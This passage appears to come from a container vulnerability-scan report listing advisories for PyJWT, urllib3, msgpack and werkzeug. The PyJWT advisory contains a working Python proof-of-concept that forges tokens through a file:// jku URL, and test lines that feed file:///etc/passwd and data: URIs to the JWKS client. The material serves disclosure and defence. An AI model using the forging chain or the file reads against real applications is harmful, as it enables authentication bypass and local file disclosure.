<tr><td>Affected range</td><td><code>>=2.0.0<br/><=2.12.1</code></td></tr>
<tr><td>Fixed version</td><td><code>2.13.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>4.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.220%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>11th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

> [!NOTE]
> The library does not directly return non-HTTP(S) URI contents to the attacker; the chained "plant a JWKS to forge tokens" scenario described in the original report requires additional application-layer flaws (attacker write access to a filesystem path, untrusted jku derivation) that this fix does not address. Severity is scored for the scheme-acceptance bug in isolation.

## Summary

PyJWKClient passes its `uri` argument directly to `urllib.request.urlopen()` which uses Python stdlib's default `OpenerDirector` registering `HTTPHandler`, `HTTPSHandler`, `FTPHandler`, **`FileHandler`**, and `DataHandler`. There is currently no documented option to restrict which schemes PyJWKClient will fetch.

If an application's `jku` URL ingestion path accepts attacker-influenced URLs (e.g., from JWT header, configuration file, OAuth flow parameter), the attacker can:

1. Cause PyJWKClient to read arbitrary local files via `file://` (SSRF on local filesystem) — the file's contents are passed to `json.load`.
2. Cause PyJWKClient to attempt FTP / data-URI fetches (broader SSRF surface).
3. **Forge tokens that PyJWT verifies as valid** — if the attacker can write to any path the JKU URL points at AND influences the URL, they can plant a JWK Set containing their own public key, sign tokens with the matching private key, and `jwt.decode()` accepts.

## Affected versions

Tested and reproducible on **PyJWT 2.11.0 and 2.12.1**. Likely all versions back to PyJWKClient introduction.

## Reproducer (full attack chain — verified empirically)

```python
import jwt as pyjwt
from jwt import PyJWKClient
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import json, base64, time

# Attacker generates keypair (no relation to real IdP)
key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub_n = key.public_key().public_numbers().n

def b64u(n):
    bl = (n.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(n.to_bytes(bl, 'big')).rstrip(b'=').decode()

# Attacker writes JWK Set containing their public key to /tmp
jwks = {"keys":[{"kty":"RSA","kid":"attacker","use":"sig","alg":"RS256",
                  "n":b64u(pub_n),"e":"AQAB"}]}
with open("/tmp/attacker.json","w") as f:
    json.dump(jwks, f)

# Attacker mints token signed with their private key, jku=file://
priv_pem = key.private_bytes(serialization.Encoding.PEM,
    serialization.PrivateFormat.PKCS8, serialization.NoEncryption())
now = int(time.time())
token = pyjwt.encode(
    {"sub":"attacker","aud":"target-app","iat":now,"exp":now+3600},
    priv_pem, algorithm="RS256",
    headers={"kid":"attacker","jku":"file:///tmp/attacker.json","typ":"JWT"})

# Vulnerable application pattern: caller derives jku from token header
# and passes to PyJWKClient without scheme validation
header = pyjwt.get_unverified_header(token)
client = PyJWKClient(header["jku"])      # <-- accepts file:// silently
key_obj = client.get_signing_key_from_jwt(token)
decoded = pyjwt.decode(token, key_obj.key, algorithms=["RS256"],
                       audience="target-app")
print("Token verified:", decoded)
# Output: Token verified: {'sub': 'attacker', 'aud': 'target-app', ...}
```

## Cross-library evidence — PyJWT is the outlier

The same composition pattern is structurally safe in 4 other mainstream JWT libraries:

| Library | Behavior on `jku=file://...` | Mechanism |
|---|---|---|
| **PyJWT 2.12.1** (Python) | **Reads file from disk, parses, uses for signature verification** | urllib default OpenerDirector includes FileHandler |
| panva/jose 6.2.3 (Node.js) | Refuses pre-fetch | WHATWG `fetch()` rejects non-http(s) at fetch-spec layer |
| golang-jwt + MicahParks/keyfunc v3.4.0 (Go) | Refuses pre-fetch | `http.DefaultTransport` only registers http/https |
| Microsoft.IdentityModel.Tokens 8.18.0 (.NET) | Refuses pre-fetch | `HttpDocumentRetriever` defaults `RequireHttps=true` |
| Spring Security NimbusJwtDecoder 6.3.4 (Java) | Refuses pre-fetch | URI parser delegation refuses non-http(s) at request build |

PyJWT is the only library of these 5 where the default behavior allows `file://` to reach the fetch layer.

## Recommended fix

Add `allowed_schemes: tuple[str, ...] = ("https", "http")` kwarg to `PyJWKClient.__init__`. Pre-validate URL scheme before invoking `urllib.request.urlopen`. URLs with disallowed schemes raise `PyJWKClientError` before any fetch is attempted.

### Diff sketch against `jwt/jwks_client.py`

```python
def __init__(
    self, uri: str,
    cache_keys: bool = False, max_cached_keys: int = 16,
    cache_jwk_set: bool = True, lifespan: float = 300,
    headers: dict[str, Any] | None = None, timeout: float = 30,
    ssl_context: SSLContext | None = None,
    allowed_schemes: tuple[str, ...] = ("https", "http"),  # NEW
):
    """...
    :param allowed_schemes: URL schemes the JWKS endpoint is permitted
        to use. Default ``("https", "http")``. Pass ``("https",)`` for
        HTTPS-only operation. URLs with disallowed schemes raise
        ``PyJWKClientError`` before any fetch is attempted.
    """
    # ... existing init code ...
    self.allowed_schemes = allowed_schemes
    self._validate_uri_scheme()


def _validate_uri_scheme(self) -> None:
    """Reject the configured URI early if its scheme isn't allowed."""
    from urllib.parse import urlparse
    parsed = urlparse(self.uri)
    scheme = parsed.scheme.lower()
    if not scheme:
        raise PyJWKClientError(
            f"PyJWKClient URI '{self.uri}' has no scheme; expected one of "
            f"{self.allowed_schemes!r}")
    if scheme not in self.allowed_schemes:
        raise PyJWKClientError(
            f"PyJWKClient URI scheme '{scheme}' is not in allowed_schemes "
            f"{self.allowed_schemes!r}; refusing to fetch from this URL")
```

### Tests to add

```python
def test_pyjwkclient_rejects_file_scheme():
    with pytest.raises(PyJWKClientError, match="not in allowed_schemes"):
        PyJWKClient("file:///etc/passwd")

def test_pyjwkclient_rejects_ftp_scheme():
    with pytest.raises(PyJWKClientError):
        PyJWKClient("ftp://example.org/keys.json")

def test_pyjwkclient_rejects_data_scheme():
    with pytest.raises(PyJWKClientError):
        PyJWKClient('data:application/json,{"keys":[]}')

def test_pyjwkclient_caller_can_lock_to_https_only():
    with pytest.raises(PyJWKClientError):
        PyJWKClient("http://internal.test/jwks.json", allowed_schemes=("https",))
```

### Compatibility

- Default `allowed_schemes=("https", "http")` preserves backwards compatibility for the overwhelming majority of callers using HTTP/HTTPS JWKS endpoints
- Breaking only for callers using non-HTTP schemes intentionally (vanishingly rare)
- No changes to urllib fetch logic itself — the fix is a pre-validation gate

## Class precedent

This is the same class as **CVE-2024-21643** (Apache Jena JKU-trust: attacker-supplied JKU URL fetched without scheme validation). NVD-rated CVSS 7.5.

## Prior art (verified 2026-05-06)

Confirmed via live recon (NVD direct, OSV.dev, PyJWT GitHub Security Advisories, issue/PR keyword search, CHANGELOG inspection):

- No existing CVE on PyJWT specifically for PyJWKClient URL scheme handling
- No existing GitHub issue or PR addressing scheme allowlisting
- No silent fix in CHANGELOG through 2.12.1
- 5 prior PyJWT advisories (CVE-2017-11424, CVE-2022-29217, CVE-2024-53861, CVE-2025-45768, CVE-2026-32597) — none cover this class

## Credit

Reported by Keijo Tuominen — independent security research at CMHT.tech (https://cmht.tech).

Reproduction artifacts available on request: full multi-language probe pack (5 wrappers × 25 fixtures × 125 cells) demonstrating cross-library divergence at the URL-scheme boundary.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-48524?s=github&n=pyjwt&t=pypi&vr=%3E%3D2.0.0%2C%3C%3D2.12.1"><img alt="low 3.7: CVE--2026--48524" src="https://img.shields.io/badge/CVE--2026--48524-lightgrey?label=low%203.7&labelColor=fce1a9"/></a> <i>Improper Cleanup on Thrown Exception</i>

<table>
<tr><td>Affected range</td><td><code>>=2.0.0<br/><=2.12.1</code></td></tr>
<tr><td>Fixed version</td><td><code>2.13.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>3.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.321%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>23rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

> [!NOTE]
>  The vulnerability surfaces only when a JWKS fetch fails; an attacker can attempt to provoke that with sustained unknown-kid traffic, but the outcome depends on upstream JWKS-endpoint behavior (rate limiting, transient errors) which is beyond the attacker's control. Impact is reduced auth availability until the next successful fetch, not complete denial of service.

## Summary
PyJWKClient.get_signing_key() forces a fresh HTTP request to the JWKS endpoint for every JWT with an unknown kid value, with no rate limiting. Since kid comes from the unverified token header, an attacker can trigger unlimited outbound requests.

Additionally, fetch_data() finally block clears the JWKS cache on network error.

## Root Cause
jwt/jwks_client.py:172-198 - get_signing_key(kid) calls get_signing_keys(refresh=True) for unknown kids, bypassing TTL cache with no cooldown.
jwt/jwks_client.py:120-122 - finally block writes None to cache on error, clearing valid data.

## Impact
- DoS against JWKS endpoint (unlimited requests per invalid token)
- DoS against application (network I/O latency)
- Cascading failure (rate limiting clears cache, breaking legitimate auth)

## Suggested Fix
1. Add refresh cooldown (refuse refresh more than once per TTL period)
2. Move cache write from finally to else block

## Affected Versions
All versions with PyJWKClient (2.4.0 through 2.12.1)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>urllib3</strong> <code>2.7.0</code> (pypi)</summary>

<small><code>pkg:pypi/urllib3@2.7.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-97689?s=github&n=urllib3&t=pypi&vr=%3E%3D1.10.3%2C%3C2.8.0"><img alt="high 8.9: CVE--2026--97689" src="https://img.shields.io/badge/CVE--2026--97689-lightgrey?label=high%208.9&labelColor=e25d68"/></a> <i>Allocation of Resources Without Limits or Throttling</i>

<table>
<tr><td>Affected range</td><td><code>>=1.10.3<br/><2.8.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.8.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.292%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>20th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Impact

urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.7.0/advanced-usage.html#streaming-and-i-o) is designed for efficiently handling large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once. When decoding a [chunked-transfer-encoded response](https://httpwg.org/specs/rfc9112.html#chunked.encoding), this API reads each chunk's size field by buffering until it sees `\n` or EOF.

A malicious HTTP server can return `Transfer-Encoding: chunked` and then send a very long run of bytes without any newline, causing the streaming client to buffer that entire run before urllib3 can reject the chunk size as invalid and allocate more memory than intended.

To fix the issue, we'll reject chunk-size fields larger than 65536 bytes, as already done in the non-streaming case, which is currently handled by the Python standard library. Note that this only applies to reading the chunk-size field, not the chunk data, which is already handled correctly. Thus, there shouldn't be any impact for non-malicious servers.

## Affected usages

Applications and libraries using urllib3 versions earlier than 2.8.0 may be affected when streaming a chunked response from untrusted sources. Specifically, this affects the [read_chunked()](https://urllib3.readthedocs.io/en/stable/reference/urllib3.response.html#urllib3.response.BaseHTTPResponse.read_chunked) and [stream()](https://urllib3.readthedocs.io/en/stable/reference/urllib3.response.html#urllib3.response.BaseHTTPResponse.stream) methods of the HTTPResponse object.

This also affects requests streaming API, which uses urllib3 under the hood.

## Remediation

Upgrade to urllib3 version 2.8.0 or later, where chunk-size fields larger than 65536 will be rejected. If upgrading is not immediately possible, consider reading the response at once using the [read()](https://urllib3.readthedocs.io/en/stable/reference/urllib3.response.html#urllib3.response.BaseHTTPResponse.read) method.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-97687?s=github&n=urllib3&t=pypi&vr=%3E%3D1.26.0%2C%3C2.8.0"><img alt="high 7.6: CVE--2026--97687" src="https://img.shields.io/badge/CVE--2026--97687-lightgrey?label=high%207.6&labelColor=e25d68"/></a> <i>Improper Certificate Validation</i>

<table>
<tr><td>Affected range</td><td><code>>=1.26.0<br/><2.8.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.8.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.6</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.242%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Impact

urllib3 supports configuring TLS independently for an HTTPS proxy and the target server.

`proxy_ssl_context`, `proxy_assert_hostname`, and `proxy_assert_fingerprint` configure the TLS connection to the proxy. `ssl_context` and the other target-specific TLS parameters configure the connection to the target server.

In urllib3 versions 1.26.0 through 2.7.0, these configurations were not consistently separated. Depending on the proxy mode, urllib3 could:

1. Ignore `proxy_ssl_context` and use the target server's SSL context for the TLS connection to an HTTPS forwarding proxy.
2. Override the HTTPS proxy's certificate-verification policy with the target server's certificate-verification policy.
3. Apply target-specific SNI, hostname assertions, certificate fingerprint assertions, or TLS client credentials to the TLS connection to an HTTPS forwarding proxy.

In particular, configuring `cert_reqs="CERT_NONE"` for a target server could overwrite the `verify_mode` of the SSL context configured for the HTTPS proxy. This modification occurred in place and persisted on the context object, potentially disabling proxy certificate verification for later connections that reused the same context.

An attacker able to intercept the connection to an HTTPS proxy may be able to impersonate the proxy when the effective proxy TLS configuration disables certificate verification or otherwise accepts the attacker's certificate. This may occur, for example, when the target server's trust or identity policy is incorrectly applied to the proxy connection.

When HTTPS forwarding is enabled, an impersonated proxy can observe or modify forwarded requests and responses, potentially exposing credentials, authentication tokens, request bodies, response data, and other sensitive information.

A TLS client certificate intended for the target server may also be presented to the proxy or to an attacker impersonating it. This can disclose the client's identity and provide proof of possession of the corresponding private key. The private key itself is not transmitted during the TLS handshake.

In CONNECT tunneling mode, impersonating the HTTPS proxy does not by itself defeat the separate end-to-end TLS connection between the client and the target server.

## Affected Usages

Code using urllib3 versions 1.26.0 through 2.7.0 may be affected in any of the following cases.

### 1. The target SSL context is used for an HTTPS forwarding proxy

HTTPS requests are forwarded through an HTTPS proxy with `use_forwarding_for_https=True`, and `proxy_ssl_context` is configured for the proxy.

urllib3 may ignore `proxy_ssl_context` and use the target server's `ssl_context` for the proxy TLS handshake. The proxy may therefore be verified using the target server's trust and certificate policy instead of the policy explicitly configured for the proxy.

### 2. The target verification policy overrides the proxy policy

An HTTPS proxy is configured with `proxy_ssl_context`, while the target server uses a different certificate-verification policy.

urllib3 may apply the target server's `cert_reqs` value to the proxy SSL context. For example, setting `cert_reqs="CERT_NONE"` for the target server may also disable certificate verification for the HTTPS proxy, even when `proxy_ssl_context` was configured to require verification.

This issue can affect the TLS connection to an HTTPS proxy in both forwarding and CONNECT tunneling configurations.

### 3. A mutated proxy SSL context is reused

The same SSL context is reused as `proxy_ssl_context` across multiple connections, and certificate verification is disabled for one target server.

urllib3 may modify the proxy SSL context's `verify_mode` in place. Later connections that reuse the same context may therefore connect to the HTTPS proxy without certificate verification.

### 4. Target-specific TLS identity or credentials are applied to the proxy

HTTPS requests are forwarded through an HTTPS proxy with `use_forwarding_for_https=True`, and target-specific SNI, hostname assertions, certificate fingerprint assertions, or TLS client credentials are configured.

urllib3 may apply these target-specific settings to the proxy TLS handshake. This may cause urllib3 to:

- send SNI intended for the target server to the proxy;
- verify the proxy using a hostname or certificate fingerprint intended for the target server; or
- present a TLS client certificate intended for the target server to the proxy.

Code connecting through a plain HTTP proxy does not establish a TLS connection to the proxy and is not affected by this issue.

## Remediation

Upgrade to urllib3 2.8.0 or later.

urllib3 2.8.0 independently applies the explicitly configured `proxy_ssl_context` and proxy-specific certificate assertions to the HTTPS proxy connection. Target-specific SNI, certificate assertions, and TLS client certificate parameters are no longer applied to the HTTPS proxy handshake.

For backward compatibility, when an HTTPS proxy is used with `use_forwarding_for_https=True` and `proxy_ssl_context` is not provided, urllib3 2.8.0 continues to use `ssl_context` for the TLS connection to the proxy. This configuration emits a `FutureWarning`. In urllib3 3.0, passing `ssl_context` with `use_forwarding_for_https=True` for an HTTPS proxy will raise an error. Applications should use `proxy_ssl_context` to configure TLS for an HTTPS forwarding proxy.

The fixes were implemented in commits b6447295fff7b38fdffc67e0df9712d60cef3cc3 and 07408cec79d1856d81bb42c74a904a24fdb9e465.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-97688?s=github&n=urllib3&t=pypi&vr=%3E%3D2.6.2%2C%3C2.8.0"><img alt="medium 6.9: CVE--2026--97688" src="https://img.shields.io/badge/CVE--2026--97688-lightgrey?label=medium%206.9&labelColor=fbb552"/></a> <i>Loop with Unreachable Exit Condition ('Infinite Loop')</i>

<table>
<tr><td>Affected range</td><td><code>>=2.6.2<br/><2.8.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.8.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.291%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>20th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

urllib3's streaming API is designed for the efficient handling of large HTTP responses by reading content in chunks instead of loading the entire response body into memory at once.

urllib3 can decompress response bodies according to the HTTP `Content-Encoding` header. When streaming a compressed, chunked response, urllib3 first consumes data already buffered by the decoder before reading the next HTTP chunk.

However, urllib3 versions from 2.6.2 through 2.7.0 could enter an infinite loop when a chunked response contained bytes after the end of the Deflate stream. If the decompressed body exceeded the requested streaming chunk size, Python's zlib implementation could retain the trailing bytes as unconsumed input after reaching the end of the compressed stream. urllib3 would repeatedly attempt to decode those same bytes without making progress or reading more data from the network.

A malicious server could exploit this behavior to cause excessive CPU usage and prevent the affected request from completing on the client. Network read timeouts would not interrupt the loop because no further socket operation was required.

### Affected usages

Applications and libraries using urllib3 versions 2.6.2 through 2.7.0 may be affected when all of the following conditions are met:

1. Compressed responses from an untrusted source are streamed using `HTTPResponse.stream(amt=N)` or `HTTPResponse.read_chunked(amt=N)` with a positive, finite chunk size.
2. Content decoding is enabled.
3. The response uses both `Transfer-Encoding: chunked` and `Content-Encoding: deflate`.
4. The decoded body exceeds the requested chunk size and the encoded body contains bytes after the end of the Deflate stream.

`HTTPResponse.stream()` uses a finite chunk size by default and is therefore affected when the other conditions are met.

### Remediation

Upgrade to urllib3 2.8.0, in which the Deflate decoder stops accepting input after reaching the end of the compressed stream and no longer reports trailing bytes as data that can produce more decoded output.

If upgrading is not immediately possible, disable automatic content decoding for responses from untrusted sources by setting `decode_content=False`, or reject streamed responses using the Deflate content encoding. Applications that disable automatic decoding must handle the compressed response safely at another layer.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>msgpack</strong> <code>1.1.2</code> (pypi)</summary>

<small><code>pkg:pypi/msgpack@1.1.2</code></small><br/>
<a href="https://scout.docker.com/v/GHSA-6v7p-g79w-8964?s=github&n=msgpack&t=pypi&vr=%3C%3D1.2.0"><img alt="high 7.5: GHSA--6v7p--g79w--8964" src="https://img.shields.io/badge/GHSA--6v7p--g79w--8964-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Use After Free</i>

<table>
<tr><td>Affected range</td><td><code><=1.2.0</code></td></tr>
<tr><td>Fixed version</td><td><code>1.2.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

If the Unpacker is used repeatedly after an error occurs, the process may crash with a SEGV.

If the Unpacker is used repeatedly to unpack untrusted input from external sources, it may be vulnerable to a DoS attack.

### Patches

v1.2.1

### Workarounds

Users should create a new Unpacker instead of reusing the same Unpacker after an error occurs.

Applying the above patch can prevent SEGV, but reusing the Streaming Unpacker after it has encountered an error will not yield correct data. If an error occurs during Streaming Unpacking, the Stream and Streaming Unpacker should be discarded.

Therefore, this is not just a workaround but the correct solution. The above patch only prevents crashes from incorrect usage.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-57585?s=pypa&n=msgpack&t=pypi&vr=%3C1.2.1"><img alt="high 7.5: CVE--2026--57585" src="https://img.shields.io/badge/CVE--2026--57585-lightgrey?label=high%207.5&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.2.1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.2.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.488%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>40th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

MessagePack is the serializer implementation for Python msgpack.org. Prior to 1.2.1, there is an Out-of-bounds read/crash on Unpacker reuse after a caught error, potentially leading to a DoS attack.  If the Unpacker is used repeatedly after an error occurs, the process may crash with a SEGV. This issue has been fixed in version 1.2.1.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 7" src="https://img.shields.io/badge/M-7-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>werkzeug</strong> <code>2.2.3</code> (pypi)</summary>

<small><code>pkg:pypi/werkzeug@2.2.3</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-34069?s=github&n=werkzeug&t=pypi&vr=%3C3.0.3"><img alt="high 7.5: CVE--2024--34069" src="https://img.shields.io/badge/CVE--2024--34069-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Cross-Site Request Forgery (CSRF)</i>

<table>
<tr><td>Affected range</td><td><code><3.0.3</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>3.397%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>88th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The debugger in affected versions of Werkzeug can allow an attacker to execute code on a developer's machine under some circumstances. This requires the attacker to get the developer to interact with a domain and subdomain they control, and enter the debugger PIN, but if they are successful it allows access to the debugger even if it is only running on localhost. This also requires the attacker to guess a URL in the developer's application that will trigger the debugger.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-49767?s=github&n=werkzeug&t=pypi&vr=%3E%3D2.0.0rc1%2C%3C%3D3.0.5"><img alt="medium 6.9: CVE--2024--49767" src="https://img.shields.io/badge/CVE--2024--49767-lightgrey?label=medium%206.9&labelColor=fbb552"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code>>=2.0.0rc1<br/><=3.0.5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.6</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.095%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>64th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Applications using Werkzeug to parse `multipart/form-data` requests are vulnerable to resource exhaustion. A specially crafted form body can bypass the `Request.max_form_memory_size` setting.


The `Request.max_content_length` setting, as well as resource limits provided by deployment software and platforms, are also available to limit the resources used during a request. This vulnerability does not affect those settings. All three types of limits should be considered and set appropriately when deploying an application.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-27199?s=github&n=werkzeug&t=pypi&vr=%3C3.1.6"><img alt="medium 6.3: CVE--2026--27199" src="https://img.shields.io/badge/CVE--2026--27199-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Improper Handling of Windows Device Names</i>

<table>
<tr><td>Affected range</td><td><code><3.1.6</code></td></tr>
<tr><td>Fixed version</td><td><code>3.1.6</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.543%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>44th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Werkzeug's `safe_join` function allows Windows device names as filenames if when preceded by other path segments.

This was previously reported as https://github.com/pallets/werkzeug/security/advisories/GHSA-hgf8-39gv-g3f2, but the added filtering failed to account for the fact that `safe_join` accepts paths with multiple segments, such as `example/NUL`.

`send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-21860?s=github&n=werkzeug&t=pypi&vr=%3C3.1.5"><img alt="medium 6.3: CVE--2026--21860" src="https://img.shields.io/badge/CVE--2026--21860-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Improper Handling of Windows Device Names</i>

<table>
<tr><td>Affected range</td><td><code><3.1.5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.1.5</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.475%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>39th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Werkzeug's `safe_join` function allows path segments with Windows device names that have file extensions or trailing spaces. On Windows, there are special device names such as `CON`, `AUX`, etc that are implicitly present and readable in every directory. Windows still accepts them with any file extension, such as `CON.txt`, or trailing spaces such as `CON `.

This was previously reported as https://github.com/pallets/werkzeug/security/advisories/GHSA-hgf8-39gv-g3f2, but the fix failed to account for compound extensions such as `CON.txt.html` or trailing spaces. It also missed some additional special names.

`send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-102598?s=github&n=werkzeug&t=pypi&vr=%3C3.1.9"><img alt="medium 6.3: CVE--2026--102598" src="https://img.shields.io/badge/CVE--2026--102598-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Improper Handling of Windows Device Names</i>

<table>
<tr><td>Affected range</td><td><code><3.1.9</code></td></tr>
<tr><td>Fixed version</td><td><code>3.1.9</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.368%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>29th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Werkzeug's `safe_join` function allows Windows device names as filenames when they have an empty ADS marker on NTFS.

This was previously reported as https://github.com/pallets/werkzeug/security/advisories/GHSA-hgf8-39gv-g3f2, but the added filtering failed to account for the fact Windows allows special device names with an empty ADS marker, such as `NUL:`.

`send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows and NTFS, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-66221?s=github&n=werkzeug&t=pypi&vr=%3C3.1.4"><img alt="medium 6.3: CVE--2025--66221" src="https://img.shields.io/badge/CVE--2025--66221-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Improper Handling of Windows Device Names</i>

<table>
<tr><td>Affected range</td><td><code><3.1.4</code></td></tr>
<tr><td>Fixed version</td><td><code>3.1.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
